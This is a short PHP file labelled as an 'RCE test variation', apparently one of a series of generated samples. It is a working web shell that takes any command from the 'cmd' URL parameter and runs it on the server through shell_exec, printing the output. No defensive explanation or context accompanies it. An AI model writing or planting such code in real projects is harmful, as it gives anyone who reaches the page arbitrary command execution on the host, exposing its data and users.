<?php
// RCE test variation #973
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>